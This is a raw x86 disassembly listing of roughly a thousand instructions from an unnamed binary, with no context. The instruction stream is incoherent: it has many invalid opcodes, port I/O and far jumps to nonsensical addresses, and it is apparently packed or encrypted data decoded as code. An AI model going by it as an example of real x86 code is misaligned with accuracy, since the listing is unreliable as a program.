  406b98:	cmc    
  406b99:	cmc    
  406b9a:	repnz mov bl,0xd3
  406b9d:	mov    bl,BYTE PTR [edi+0x8]
  406ba0:	cld    
  406ba1:	test   ecx,edi
  406ba3:	shr    DWORD PTR [ebx],0x57
  406ba6:	sbb    ebx,ebx
  406ba8:	aad    0xf3
  406baa:	fst    DWORD PTR [ecx]
  406bac:	jle    0x406bea
  406bae:	xor    al,0xd6
  406bb0:	scas   eax,DWORD PTR es:[edi]
  406bb1:	push   eax
  406bb2:	mov    esi,0xcff2c16b
  406bb7:	icebp  
  406bb8:	fdiv   DWORD PTR [edx-0x70]
  406bbb:	call   0x4aeadc4c
  406bc0:	cdq    
  406bc1:	test   eax,0x405cabc2
  406bc6:	jl     0x406c2a
  406bc8:	jecxz  0x406b72
  406bca:	pop    ecx
  406bcb:	gs jno 0x406c09
  406bce:	xchg   ebp,eax
  406bcf:	mov    ch,0xa6
  406bd1:	call   0xe037:0x4adee7f3
  406bd8:	pop    edx
  406bd9:	fistp  DWORD PTR [ebx-0x14]
  406bdc:	arpl   ax,di
  406bde:	pop    edi
  406bdf:	or     cl,cl
  406be1:	out    0xb5,al
  406be3:	xor    ecx,ecx
  406be5:	call   FWORD PTR [eax-0x31]
  406be8:	add    BYTE PTR [ebx],al
  406bea:	add    al,0x70
  406bec:	xor    DWORD PTR [esi],0xaf0fae3c
  406bf2:	imul   esp,DWORD PTR [ebx-0x3da50a70],0xa198ea28
  406bfc:	mov    ebp,0x9521e018
  406c01:	loop   0x406bbe
  406c03:	in     al,dx
  406c04:	cmp    al,0x33
  406c06:	sbb    ebx,DWORD PTR [ebx+0xa]
  406c09:	pop    ss
  406c0a:	jb     0x406c36
  406c0c:	push   ecx
  406c0d:	and    esp,esp
  406c0f:	mov    ds:0x6c6aa90d,eax
  406c14:	mov    ds:0xb273c45a,eax
  406c19:	loopne 0x406c08
  406c1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c1c:	outs   dx,BYTE PTR ds:[esi]
  406c1d:	icebp  
  406c1e:	out    0xce,eax
  406c20:	(bad)  ds:0xc66f1485
  406c26:	jbe    0x406bbb
  406c28:	pushf  
  406c29:	cli    
  406c2a:	fs jmp 0x406c14
  406c2d:	sti    
  406c2e:	adc    al,0x24
  406c30:	lds    edi,FWORD PTR [eax+0x536c68c8]
  406c36:	lods   eax,DWORD PTR ds:[esi]
  406c37:	pop    ecx
  406c38:	jle    0x406c1f
  406c3a:	fld    TBYTE PTR [eax-0x2b]
  406c3d:	neg    BYTE PTR [edx+0x3d]
  406c40:	sbb    bl,BYTE PTR [edi]
  406c42:	and    dh,BYTE PTR [edi]
  406c44:	mov    esi,0xd094f4b
  406c49:	fsub   DWORD PTR [edi-0xec482e]
  406c4f:	add    esp,0xffffffd9
  406c52:	sbb    al,0xa0
  406c54:	pop    eax
  406c55:	dec    ebp
  406c56:	sahf   
  406c57:	mov    dh,0x9f
  406c59:	mov    bl,0x48
  406c5b:	jae    0x406c56
  406c5d:	cwde   
  406c5e:	jbe    0x406cd3
  406c60:	pop    ds
  406c61:	ror    DWORD PTR ds:0x1ab6ed33,1
  406c67:	imul   edx,esi,0x5e
  406c6a:	ret    
  406c6b:	(bad)  
  406c6c:	(bad)  
  406c6d:	mov    esp,0x8dea708b
  406c72:	fwait
  406c73:	shl    BYTE PTR [esi],0xbb
  406c76:	push   eax
  406c77:	mov    bh,0x64
  406c79:	jle    0x406cbe
  406c7b:	aad    0x28
  406c7d:	loopne 0x406c49
  406c7f:	inc    esp
  406c80:	fbld   TBYTE PTR [eax+ebp*8]
  406c83:	les    ebx,FWORD PTR [esi-0x5f88a96a]
  406c89:	mov    al,ds:0xb1ed94e
  406c8e:	pop    es
  406c8f:	sbb    al,0xfa
  406c91:	or     BYTE PTR [ecx+0x17f7431],bh
  406c97:	lock dec ebx
  406c99:	add    bh,BYTE PTR [edi+0x87988f1]
  406c9f:	xor    esi,eax
  406ca1:	out    0xf3,al
  406ca3:	inc    esi
  406ca4:	(bad)  
  406ca6:	lock aad 0x8b
  406ca9:	pop    esp
  406caa:	(bad)
  406cad:	xchg   esp,eax
  406cae:	add    al,0xd0
  406cb0:	dec    esi
  406cb1:	mov    ebp,?
  406cb3:	jmp    0x693ff41f
  406cb8:	xchg   esi,eax
  406cb9:	imul   esp,ecx,0xde42eff
  406cbf:	out    dx,eax
  406cc0:	or     BYTE PTR [ecx+0x5d112469],ch
  406cc6:	jno    0x406c92
  406cc8:	shl    BYTE PTR ds:0x19af982e,0xd9
  406ccf:	cmp    bl,BYTE PTR [eax-0x7b75f879]
  406cd5:	in     eax,0x33
  406cd7:	jno    0x406d1d
  406cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cda:	inc    esi
  406cdb:	push   ebx
  406cdc:	enter  0xd1f5,0x55
  406ce0:	mov    bl,0x33
  406ce2:	and    al,0xe3
  406ce4:	test   eax,0xfa65ab84
  406ce9:	mov    ds:0x3dc9ceb5,al
  406cee:	cmp    eax,0x21ca0b66
  406cf3:	lods   eax,DWORD PTR ds:[esi]
  406cf4:	out    dx,eax
  406cf5:	imul   ebp,DWORD PTR [edx+0xf421b7],0xbd846c62
  406cff:	cmp    BYTE PTR [ebp-0x11ec4ac5],dl
  406d05:	xor    cl,BYTE PTR [edx-0x41]
  406d08:	stc    
  406d09:	jns    0x406d79
  406d0b:	out    dx,eax
  406d0c:	xor    bh,bl
  406d0e:	push   ebp
  406d0f:	ret    
  406d10:	mov    edi,0x9ada9f44
  406d15:	sub    al,0xf7
  406d17:	push   es
  406d18:	int    0x8f
  406d1a:	pop    edx
  406d1b:	popf   
  406d1c:	and    BYTE PTR [edx-0x39ff649a],ah
  406d22:	retf   
  406d23:	push   ss
  406d24:	add    cl,cl
  406d26:	(bad)  
  406d27:	stos   BYTE PTR es:[edi],al
  406d28:	iret   
  406d29:	push   ecx
  406d2a:	adc    ah,dh
  406d2c:	mov    ecx,0x1bd47cb2
  406d31:	fist   WORD PTR [ecx+0x69ef85df]
  406d37:	retf   
  406d38:	and    al,0xaf
  406d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d3b:	mov    bh,0x73
  406d3d:	and    al,0x79
  406d3f:	xchg   esi,eax
  406d40:	add    al,0x5a
  406d42:	aas    
  406d43:	aad    0x6c
  406d45:	mov    edi,0x90fc6a6d
  406d4a:	jl     0x406da2
  406d4c:	cli    
  406d4d:	pop    esi
  406d4e:	push   edx
  406d4f:	fnstcw WORD PTR [esi*2+0x1083d7fa]
  406d56:	and    al,0xe
  406d58:	jle    0x406d9d
  406d5a:	mov    DWORD PTR [ecx],esi
  406d5c:	dec    esp
  406d5d:	cmp    DWORD PTR [edx],0x3f
  406d60:	xor    ecx,DWORD PTR [edi+eiz*2+0x1e]
  406d64:	sub    bh,ah
  406d66:	clc    
  406d67:	sub    DWORD PTR [esp+ebx*4+0x58],esi
  406d6b:	stc    
  406d6c:	inc    edx
  406d6d:	cmp    DWORD PTR [esi+0x2076814b],edi
  406d73:	cwde   
  406d74:	jmp    0x406d24
  406d76:	adc    DWORD PTR [edi-0x5fd3a817],edx
  406d7c:	ret    
  406d7d:	cld    
  406d7e:	out    0x3d,al
  406d80:	sub    DWORD PTR [ecx],ebp
  406d82:	xchg   BYTE PTR [edi-0x3e995de8],al
  406d88:	push   edi
  406d89:	icebp  
  406d8a:	popa   
  406d8b:	cmc    
  406d8c:	mov    ebx,0x8427a00
  406d91:	jb     0x406d64
  406d93:	arpl   WORD PTR [esi+0x7c],bx
  406d96:	rcl    BYTE PTR [esi+0x6a],1
  406d99:	(bad)  
  406d9a:	mov    ds:0x6e9875db,eax
  406d9f:	mov    bh,0xb1
  406da1:	cmp    ebp,edx
  406da3:	ja     0x406d83
  406da5:	mov    fs,WORD PTR [edi]
  406da7:	bt     edx,edi
  406daa:	sti    
  406dab:	cld    
  406dac:	dec    edi
  406dad:	jmp    0x6cfba5c2
  406db2:	inc    esi
  406db3:	imul   BYTE PTR [esi]
  406db5:	xor    al,0xda
  406db7:	loopne 0x406df1
  406db9:	sbb    esp,DWORD PTR [esi+edx*2-0x6a893309]
  406dc0:	add    ebp,DWORD PTR [ecx+0x79cd618]
  406dc6:	loop   0x406e12
  406dc8:	inc    edi
  406dc9:	pop    ss
  406dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dcb:	mov    bh,0xfb
  406dcd:	sub    BYTE PTR [esi+edx*4],ah
  406dd0:	inc    eax
  406dd1:	dec    edi
  406dd2:	(bad)  
  406dd3:	popa   
  406dd4:	out    0xc6,eax
  406dd6:	leave  
  406dd7:	fstp   st(1)
  406dd9:	cmp    dl,BYTE PTR [edx]
  406ddb:	aad    0xe1
  406ddd:	test   eax,0x2e30ac4b
  406de2:	jp     0x406e38
  406de4:	xor    BYTE PTR [ebx+0x233f2f99],dh
  406dea:	jno    0x406e60
  406dec:	xchg   ebx,eax
  406ded:	mov    dh,BYTE PTR [eax-0x38f61993]
  406df3:	test   DWORD PTR [ebp-0xc57e4b9],esp
  406df9:	inc    esp
  406dfa:	aad    0x80
  406dfc:	jp     0x406e3c
  406dfe:	call   0xcef2:0x71f222c1
  406e05:	mov    cl,0x88
  406e07:	mov    WORD PTR [esi+0x789cc848],?
  406e0d:	mov    ecx,0x10cf55a6
  406e12:	(bad)  
  406e13:	iret   
  406e14:	pop    esp
  406e15:	(bad)  [eax+0x2883ce65]
  406e1b:	pop    ss
  406e1c:	xlat   BYTE PTR ds:[ebx]
  406e1d:	sbb    DWORD PTR [ecx-0x46dd7a44],eax
  406e23:	popf   
  406e24:	inc    edi
  406e25:	ret    0x684f
  406e28:	adc    dl,BYTE PTR [ecx-0x4e0133be]
  406e2e:	jb     0x406e06
  406e30:	loopne 0x406db8
  406e32:	push   cs
  406e33:	fidiv  WORD PTR [edx+0x38]
  406e36:	pop    ebx
  406e37:	cmp    eax,0x90a122b2
  406e3c:	scas   al,BYTE PTR es:[edi]
  406e3d:	dec    ecx
  406e3e:	cmp    cl,BYTE PTR [ebp+0x4a]
  406e41:	in     al,0x40
  406e43:	add    bh,BYTE PTR [esp+ebx*4-0x34]
  406e47:	pop    ss
  406e48:	imul   edx,DWORD PTR [edx-0x6d442d69],0xb1abc43
  406e52:	mov    WORD PTR [eax+0x7c8490ad],cs
  406e58:	inc    ecx
  406e59:	addr16 popa 
  406e5b:	int    0x3f
  406e5d:	lea    esi,[eax-0x69]
  406e60:	rcl    DWORD PTR cs:[eax-0x7e],1
  406e64:	jle    0x406ed7
  406e66:	add    esi,DWORD PTR [ebx+ecx*8+0x5d]
  406e6a:	cmp    BYTE PTR [edx-0x42],bh
  406e6d:	jl     0x406dfc
  406e6f:	xor    eax,0xd65c302e
  406e74:	aaa    
  406e75:	and    esi,esi
  406e77:	fldcw  WORD PTR [ebp+0x3f2dbc52]
  406e7d:	mov    bl,0x97
  406e7f:	ror    DWORD PTR [edx-0x1e254f31],1
  406e85:	repz dec edi
  406e87:	jmp    0x2fbbe543
  406e8c:	and    BYTE PTR [edx-0x36],ah
  406e8f:	fisub  DWORD PTR [edx-0x46c36153]
  406e95:	jecxz  0x406e2b
  406e97:	test   DWORD PTR [ebx+0x34],0xd70e4fd8
  406e9e:	pop    ds
  406e9f:	add    BYTE PTR [edi+ebp*1-0x46e29e22],ch
  406ea6:	cmp    eax,0xd5cef7f5
  406eab:	mov    ecx,DWORD PTR [esi-0x3af96725]
  406eb1:	dec    ecx
  406eb2:	imul   ebx,DWORD PTR [edi+0x33e9b09a],0x3d1edcf8
  406ebc:	cmp    al,0x7d
  406ebe:	out    0x85,al
  406ec0:	jmp    0x406e61
  406ec2:	mov    ds:0xbf3de38e,al
  406ec7:	shr    esi,0xf6
  406eca:	sub    eax,0xcfdd3cbc
  406ecf:	dec    ebp
  406ed0:	pop    DWORD PTR [ebp-0x80]
  406ed3:	push   esi
  406ed4:	jno    0x406e92
  406ed6:	(bad)  ds:[esp+ebx*8+0x42cf7e75]
  406ede:	in     eax,0xcb
  406ee0:	inc    eax
  406ee1:	xchg   edx,eax
  406ee2:	in     eax,dx
  406ee3:	fsubr  QWORD PTR [ebx+0x43]
  406ee6:	loope  0x406f34
  406ee8:	lods   al,BYTE PTR ds:[esi]
  406ee9:	fadd   st,st(6)
  406eeb:	mov    eax,ds:0x7063a64c
  406ef0:	rcr    BYTE PTR [edx-0x3f],cl
  406ef3:	sbb    al,0x7
  406ef5:	xchg   ebx,eax
  406ef6:	mov    cs,ebx
  406ef8:	push   edi
  406ef9:	scas   eax,DWORD PTR es:[edi]
  406efa:	adc    eax,0x699ac9a8
  406eff:	fwait
  406f00:	aad    0x7b
  406f02:	jae    0x406efe
  406f04:	jne    0x406efe
  406f06:	aaa    
  406f07:	test   eax,0xd4a99447
  406f0c:	fs rcr al,cl
  406f0f:	ds pop es
  406f11:	ror    BYTE PTR [esp+ecx*8+0x77],cl
  406f15:	loop   0x406e9c
  406f17:	jge    0x406ec6
  406f19:	jno    0x406f76
  406f1b:	cmp    eax,0x9d293c41
  406f20:	inc    ebp
  406f21:	imul   ecx,DWORD PTR [ecx],0xf2b8c75f
  406f27:	fisubr DWORD PTR [edx]
  406f29:	jno    0x406f70
  406f2b:	push   ecx
  406f2c:	jnp    0x406f85
  406f2e:	cmp    DWORD PTR [ecx+0xc],0x31
  406f32:	(bad)  
  406f33:	push   edx
  406f34:	jno    0x406ee8
  406f36:	in     eax,dx
  406f37:	push   esp
  406f38:	dec    esp
  406f39:	pop    edi
  406f3a:	fwait
  406f3b:	mov    ds:0xce1299c0,eax
  406f40:	or     esp,DWORD PTR [esi+ecx*1-0x7050a5c6]
  406f47:	or     dl,cl
  406f49:	jmp    0x406f34
  406f4b:	dec    edi
  406f4c:	dec    esi
  406f4d:	jl     0x406f14
  406f4f:	jnp    0x406f62
  406f51:	mov    edi,DWORD PTR [bx+di-0x7c0d]
  406f56:	add    al,0x63
  406f58:	leave  
  406f59:	cld    
  406f5a:	imul   ecx,DWORD PTR [ebp-0xb],0xffffffcd
  406f5e:	xchg   ecx,eax
  406f5f:	fxch   st(5)
  406f61:	fiadd  DWORD PTR [edi-0x2ed4c731]
  406f67:	sub    bl,BYTE PTR [ecx]
  406f69:	pop    ds
  406f6a:	scas   al,BYTE PTR es:[edi]
  406f6b:	(bad)  
  406f6c:	sub    al,0x2
  406f6e:	adc    al,0x76
  406f70:	mov    ds:0xa4a8ff3f,eax
  406f75:	or     al,0x69
  406f77:	fmul   DWORD PTR [esi]
  406f79:	(bad)  
  406f7a:	xor    dl,0xce
  406f7d:	mov    BYTE PTR [edx],dl
  406f7f:	xor    cl,cl
  406f81:	stos   BYTE PTR es:[edi],al
  406f82:	push   es
  406f83:	fdiv   DWORD PTR [eax]
  406f85:	jae    0x406f5d
  406f87:	fisubr WORD PTR [eax-0x62]
  406f8a:	out    0x81,al
  406f8c:	pop    es
  406f8d:	imul   ecx,edx,0xfffffffc
  406f90:	mov    ds:0x7f33c2d9,eax
  406f95:	mov    ebp,0xc801a5f9
  406f9a:	mov    al,ds:0x38a9cd62
  406f9f:	cmp    eax,0xbd70ecde
  406fa4:	fdivr  QWORD PTR ds:0x32f67a51
  406faa:	sub    eax,0x61439f0d
  406faf:	add    eax,0xd72bc0
  406fb4:	sub    BYTE PTR [edx],bh
  406fb6:	pop    eax
  406fb7:	rol    esp,1
  406fb9:	rol    BYTE PTR [ecx+0x67d4cd19],1
  406fbf:	push   ds
  406fc0:	adc    BYTE PTR [edi-0x27d7b14d],ah
  406fc6:	(bad)  
  406fc7:	stos   BYTE PTR es:[edi],al
  406fc8:	imul   esi,DWORD PTR [edx+0x4f],0x27
  406fcc:	mov    WORD PTR [edx-0xa16b291],?
  406fd2:	inc    eax
  406fd3:	pop    es
  406fd4:	dec    eax
  406fd5:	test   eax,0x9912964
  406fda:	retf   
  406fdb:	dec    eax
  406fdc:	loope  0x406f7a
  406fde:	retf   
  406fdf:	aam    0xe2
  406fe1:	mov    ds:0xc6ae7100,al
  406fe6:	adc    BYTE PTR ds:0xd5a59f33,dl
  406fec:	lahf   
  406fed:	push   cs
  406fee:	jno    0x406faf
  406ff0:	jne    0x406f7f
  406ff2:	js     0x407045
  406ff4:	sbb    dl,BYTE PTR [eax+ebx*4]
  406ff7:	mov    esi,0x7b1d00ff
  406ffc:	and    BYTE PTR [eax],ch
  406ffe:	cld    
  406fff:	cmp    eax,ebx
  407001:	adc    dh,BYTE PTR [edi+0x7de20106]
  407007:	or     dh,BYTE PTR [edx]
  407009:	jae    0x406fcd
  40700b:	or     ebx,DWORD PTR [ecx]
  40700d:	mov    DWORD PTR [edi],ecx
  40700f:	cmp    DWORD PTR [eax-0x18],ebp
  407012:	retf   
  407013:	fmul   DWORD PTR [edx-0x5e401442]
  407019:	stos   DWORD PTR es:[edi],eax
  40701a:	daa    
  40701b:	mov    al,0x66
  40701d:	pop    esp
  40701e:	fist   DWORD PTR gs:[ebx-0x5c]
  407022:	pop    esp
  407023:	(bad)  
  407024:	cld    
  407025:	pop    ebx
  407026:	sub    bh,dl
  407028:	mov    edx,0xc8d65cfe
  40702d:	sahf   
  40702e:	int3   
  40702f:	jo     0x40702c
  407031:	idiv   DWORD PTR [ebx]
  407033:	push   eax
  407034:	sbb    ecx,esp
  407036:	call   FWORD PTR [edi]
  407038:	xchg   edi,eax
  407039:	imul   BYTE PTR es:[ebp-0x18c2344]
  407040:	aas    
  407041:	mov    dl,BYTE PTR [esi-0x67]
  407044:	outs   dx,DWORD PTR ds:[esi]
  407045:	(bad)  
  407047:	aam    0xba
  407049:	mov    ebx,DWORD PTR [esi+0x1b52e503]
  40704f:	ins    DWORD PTR es:[edi],dx
  407050:	jp     0x407003
  407052:	sbb    eax,0xf81f1524
  407057:	jmp    0x3024:0x88ce12b1
  40705e:	fwait
  40705f:	add    al,0xf0
  407061:	or     eax,0x877839ea
  407066:	mov    edx,0x9010e8c2
  40706b:	inc    ebx
  40706c:	jno    0x40706c
  40706e:	in     al,dx
  40706f:	or     al,0xf3
  407071:	push   ds
  407072:	test   BYTE PTR [ecx],dh
  407074:	pop    esp
  407075:	imul   ecx,DWORD PTR [esi+0x3cee96b7],0x33
  40707c:	jns    0x407046
  40707e:	xor    al,0x89
  407080:	cmp    bh,ah
  407082:	pop    ebx
  407083:	fdivr  st,st(6)
  407085:	hlt    
  407086:	xchg   esp,eax
  407087:	test   BYTE PTR [ebp+0x5708acda],bl
  40708d:	sub    esi,ebx
  40708f:	cmp    dh,BYTE PTR [ebp+0x11]
  407092:	mov    ch,0x6f
  407094:	leave  
  407095:	sbb    esp,DWORD PTR [eax]
  407097:	dec    edx
  407098:	ins    BYTE PTR es:[edi],dx
  407099:	and    DWORD PTR [ebp+0x704955d1],0xffffffb2
  4070a0:	gs push es
  4070a2:	fucomp st(5)
  4070a4:	gs in  al,dx
  4070a6:	push   edi
  4070a7:	in     al,0xa4
  4070a9:	mov    esp,0xf5990fc2
  4070ae:	push   ds
  4070af:	add    dl,bl
  4070b1:	adc    BYTE PTR [esp+ebx*1+0x1f2a0924],cl
  4070b8:	xchg   ebx,eax
  4070b9:	or     edx,DWORD PTR [ebx+eax*8+0xb]
  4070bd:	fst    DWORD PTR [ecx-0x29]
  4070c0:	je     0x4070be
  4070c2:	xchg   edi,eax
  4070c3:	inc    ecx
  4070c4:	sub    dl,BYTE PTR [edx]
  4070c6:	sbb    al,0x0
  4070c8:	mov    ah,0x88
  4070ca:	mov    DWORD PTR [esp+eax*4],edi
  4070cd:	jb     0x407087
  4070cf:	pop    es
  4070d0:	rol    BYTE PTR [ebx],0x96
  4070d3:	scas   al,BYTE PTR es:[edi]
  4070d4:	fiadd  DWORD PTR [eax+0x74fcc42a]
  4070da:	mov    al,ds:0x3034afd6
  4070df:	push   esi
  4070e0:	push   0x2c27d6ef
  4070e5:	xor    eax,0x5f3e7f2e
  4070ea:	cmp    BYTE PTR [esi+edx*1],cl
  4070ed:	push   cs
  4070ee:	dec    ecx
  4070ef:	jmp    0x4070f3
  4070f1:	pop    ebx
  4070f2:	xchg   BYTE PTR [edi+0x5498d7bf],ch
  4070f8:	inc    edi
  4070f9:	jno    0x4070e3
  4070fb:	ret    
  4070fc:	cmp    DWORD PTR [edi+0x731090ec],edx
  407102:	mov    DWORD PTR [esp+ecx*8-0x6d73248c],ebx
  407109:	or     al,0x1a
  40710b:	or     al,0xd3
  40710d:	stc    
  40710e:	push   ebp
  40710f:	loopne 0x40710f
  407111:	pop    ss
  407112:	loope  0x4070a5
  407114:	ret    
  407115:	call   0x2435:0xbbbed40b
  40711c:	ds dec esp
  40711e:	rcl    DWORD PTR [ebx],cl
  407120:	jae    0x4070ff
  407122:	jle    0x407163
  407124:	sub    al,0xb5
  407126:	imul   esi,DWORD PTR [ebp-0x3c1c1765],0x92cea7e6
  407130:	mov    eax,ds:0xe755bd42
  407135:	fcomp  DWORD PTR [esi+0x21286e79]
  40713b:	inc    eax
  40713c:	div    bl
  40713e:	fcmovnb st,st(7)
  407140:	inc    ebp
  407141:	pop    ecx
  407142:	lods   al,BYTE PTR ds:[esi]
  407143:	mov    ecx,0x756848a0
  407148:	and    esi,DWORD PTR [edi+0x56]
  40714b:	rol    dh,0xf6
  40714e:	loopne 0x407110
  407150:	ror    BYTE PTR [esi],1
  407152:	retf   0x8f6d
  407155:	and    edx,DWORD PTR [edx-0x63]
  407158:	and    eax,0xe3d81565
  40715d:	es clc 
  40715f:	xchg   BYTE PTR [esi+0x6d],bl
  407162:	call   0xaf2390fd
  407167:	fcomi  st,st(0)
  407169:	(bad)  
  40716a:	mov    al,ds:0x40f4a534
  40716f:	cs mov dh,0x1a
  407172:	push   edi
  407173:	jae    0x4071dd
  407175:	xor    eax,0x85fdcd3b
  40717a:	pop    esi
  40717b:	lods   al,BYTE PTR ds:[esi]
  40717c:	or     al,0x5b
  40717e:	xchg   edx,eax
  40717f:	and    BYTE PTR [ebp-0x6d],al
  407182:	fidivr DWORD PTR [ebx]
  407184:	dec    ecx
  407185:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407186:	es xor al,0x65
  407189:	lock fistp DWORD PTR [ecx+0x1d]
  40718d:	jns    0x4071ea
  40718f:	or     cl,al
  407191:	push   ecx
  407192:	jmp    0x40711f
  407194:	xor    ebx,esp
  407196:	outs   dx,BYTE PTR ds:[esi]
  407197:	jmp    0x407140
  407199:	xchg   ebp,eax
  40719a:	mov    ds:0x30046e91,eax
  40719f:	or     BYTE PTR [edi-0x5c],0xa7
  4071a3:	adc    ah,cl
  4071a5:	push   0x44c83f96
  4071aa:	lock imul BYTE PTR [ebp-0x2a]
  4071ae:	int    0xb4
  4071b0:	enter  0x2f0e,0xd6
  4071b4:	mov    eax,ds:0x370dd182
  4071b9:	and    DWORD PTR [edi],ecx
  4071bb:	push   edi
  4071bc:	pop    esi
  4071bd:	ror    eax,0x24
  4071c0:	scas   eax,DWORD PTR es:[edi]
  4071c1:	cwde   
  4071c2:	mov    eax,0xfb79d7e3
  4071c7:	cmc    
  4071c8:	gs test eax,0x9f5cf102
  4071ce:	mov    edx,0x8121955f
  4071d3:	inc    ebx
  4071d4:	pop    edi
  4071d5:	pop    edx
  4071d6:	into   
  4071d7:	cmp    eax,0x6ddab930
  4071dc:	dec    ebx
  4071dd:	loop   0x4071f0
  4071df:	inc    ebp
  4071e0:	push   esi
  4071e1:	into   
  4071e2:	cmp    DWORD PTR [ecx],edi
  4071e4:	xor    DWORD PTR [esi+0x18],0x7a63520b
  4071eb:	cmp    al,0x5
  4071ed:	dec    ebp
  4071ee:	xor    esp,eax
  4071f0:	jp     0x4071a4
  4071f2:	push   ecx
  4071f3:	nop
  4071f4:	cmc    
  4071f5:	fs pop ss
  4071f7:	add    esi,DWORD PTR [ebx]
  4071f9:	pop    ss
  4071fa:	inc    esp
  4071fb:	push   eax
  4071fc:	fld    QWORD PTR [eax+0x513f5698]
  407202:	mov    WORD PTR ss:[edi+esi*1+0x47],fs
  407207:	inc    ecx
  407208:	test   edx,ecx
  40720a:	pop    eax
  40720b:	adc    eax,ebx
  40720d:	mov    esi,0x1a0b6b9a
  407212:	pop    ds
  407213:	data16 add BYTE PTR [edi],al
  407216:	sbb    BYTE PTR [ebp+0x1],bl
  407219:	xchg   edi,eax
  40721a:	and    DWORD PTR [ecx],ecx
  40721c:	push   0x1
  40721e:	outs   dx,BYTE PTR ds:[esi]
  40721f:	dec    ecx
  407220:	loop   0x4071fc
  407222:	sub    ch,ah
  407224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407225:	in     al,0xc6
  407227:	mov    fs,esi
  407229:	scas   eax,DWORD PTR es:[edi]
  40722a:	pusha  
  40722b:	out    dx,al
  40722c:	ins    BYTE PTR es:[edi],dx
  40722d:	push   cs
  40722e:	sbb    DWORD PTR [edx-0x1b],eax
  407231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407232:	leave  
  407233:	(bad)  
  407234:	out    0x94,eax
  407236:	and    ebx,ecx
  407238:	xor    esp,DWORD PTR [edx+0x4a0c594]
  40723e:	cli    
  40723f:	jle    0x40729e
  407241:	and    eax,DWORD PTR [ecx+ebp*4]
  407244:	cld    
  407245:	pop    esi
  407246:	cld    
  407247:	dec    ecx
  407248:	out    0x1e,eax
  40724a:	paddsw mm5,QWORD PTR ds:0x77722c1
  407251:	push   0xc3598221
  407256:	dec    ebp
  407257:	xor    BYTE PTR [ecx+0x20],0x83
  40725b:	stos   BYTE PTR es:[edi],al
  40725c:	dec    eax
  40725d:	aaa    
  40725e:	push   ebp
  40725f:	rcl    bl,cl
  407261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407262:	pop    ebx
  407263:	jge    0x407246
  407265:	sahf   
  407266:	jo     0x407224
  407268:	bnd ret 0x40b4
  40726c:	or     eax,0xfd4cc3b9
  407271:	xor    ah,dl
  407273:	sahf   
  407274:	adc    al,0xcf
  407276:	mov    ebp,0x1afef475
  40727b:	outs   dx,BYTE PTR ds:[esi]
  40727c:	ror    BYTE PTR [eax],1
  40727e:	mov    dl,0x7a
  407280:	dec    ebx
  407281:	add    ebp,DWORD PTR [edx*4+0x85fc51e]
  407288:	push   edi
  407289:	aas    
  40728a:	xor    BYTE PTR [edx+eax*2],bl
  40728d:	pop    eax
  40728e:	sahf   
  40728f:	adc    DWORD PTR [ecx],edx
  407291:	cmp    DWORD PTR [esi],edx
  407293:	sub    eax,0x3a90d0
  407298:	push   0x58
  40729a:	mov    eax,0xb7c68fcb
  40729f:	jg     0x407285
  4072a1:	dec    ebx
  4072a2:	push   ecx
  4072a3:	sbb    dl,dl
  4072a5:	(bad)  
  4072a6:	sub    eax,0x5c98ae62
  4072ab:	mov    sp,0xf76a
  4072af:	dec    edi
  4072b0:	mov    dl,0xf9
  4072b2:	ins    BYTE PTR es:[edi],dx
  4072b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072b4:	ret    
  4072b5:	iret   
  4072b6:	inc    eax
  4072b7:	sahf   
  4072b8:	fwait
  4072b9:	jecxz  0x40730d
  4072bb:	adc    esp,ecx
  4072bd:	sahf   
  4072be:	mov    DWORD PTR [ecx+ecx*4-0x4c],esi
  4072c2:	or     DWORD PTR [edx],ebp
  4072c4:	sub    eax,0x8471f587
  4072c9:	adc    eax,0x73faf5de
  4072ce:	sbb    ebx,DWORD PTR [ecx+0x2a1bb035]
  4072d4:	mov    eax,0xbdd8789f
  4072d9:	mov    dl,0x11
  4072db:	lods   eax,DWORD PTR ds:[esi]
  4072dc:	push   edx
  4072dd:	ja     0x4072b3
  4072df:	sbb    dh,BYTE PTR [ebx-0x36]
  4072e2:	js     0x407283
  4072e4:	jno    0x40727f
  4072e6:	arpl   WORD PTR [edx-0x16],di
  4072e9:	add    DWORD PTR [edi-0x74],esp
  4072ec:	xor    al,0x26
  4072ee:	aad    0x1c
  4072f0:	xchg   edi,eax
  4072f1:	xor    bl,al
  4072f3:	add    al,BYTE PTR [ecx]
  4072f5:	sub    al,0xb7
  4072f7:	shl    esp,cl
  4072f9:	xchg   edx,eax
  4072fa:	icebp  
  4072fb:	adc    esi,esi
  4072fd:	mov    ebp,DWORD PTR [ecx-0x4a]
  407300:	(bad)  
  407302:	or     eax,0x7b61e70e
  407307:	fist   WORD PTR [edx-0x1de25dc3]
  40730d:	(bad)  
  40730e:	(bad)  
  40730f:	pop    edx
  407310:	mov    al,cs:0x4ad1935
  407316:	fmul   st,st(3)
  407319:	sbb    esp,ebp
  40731b:	out    dx,eax
  40731c:	xor    al,0x31
  40731e:	cdq    
  40731f:	push   0x7c90d82b
  407324:	add    al,0x9f
  407326:	xchg   esp,eax
  407327:	lea    esi,[eax-0x6]
  40732a:	daa    
  40732b:	dec    ecx
  40732c:	das    
  40732d:	into   
  40732e:	jg     0x407397
  407330:	loop   0x407331
  407332:	and    al,0xbb
  407334:	out    dx,eax
  407335:	out    dx,al
  407336:	pop    eax
  407337:	jp     0x407387
  407339:	(bad)  
  40733a:	xchg   esi,eax
  40733b:	add    al,0x80
  40733d:	lahf   
  40733e:	jno    0x40737b
  407340:	mov    ds:0x925ce551,eax
  407345:	adc    eax,0x855b8249
  40734a:	es call 0xf4f4:0xc0e859d6
  407352:	add    dl,BYTE PTR [esi+esi*1]
  407355:	push   ss
  407356:	add    DWORD PTR [edx+0x792a5942],esp
  40735c:	stos   DWORD PTR es:[edi],eax
  40735d:	push   ds
  40735e:	adc    edi,DWORD PTR [eax-0xbaccd19]
  407364:	enter  0x14ee,0x19
  407368:	xor    BYTE PTR [esi*4+0x5e744c1b],al
  40736f:	mov    WORD PTR [edi],ds
  407371:	cli    
  407372:	ds sbb eax,0xd738385a
